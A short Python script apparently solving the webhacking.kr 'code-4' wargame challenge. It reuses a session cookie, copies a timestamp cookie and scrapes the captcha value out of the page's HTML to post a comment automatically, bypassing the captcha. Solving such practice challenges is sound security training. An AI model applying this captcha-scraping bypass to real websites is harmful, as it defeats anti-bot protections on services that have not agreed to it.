import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/code-4/index.php'
response = requests.get(url, cookies=cookies)

timestamp = response.cookies['st']
cookies['st'] = timestamp

import re
captcha = re.findall('name=captcha_ value="(.*)" ', response.text)[0]
data = {'id':'asdf', 'cmt':'asdf', 'captcha':captcha}

response = requests.post(url, cookies=cookies, data=data)
print(response.text)

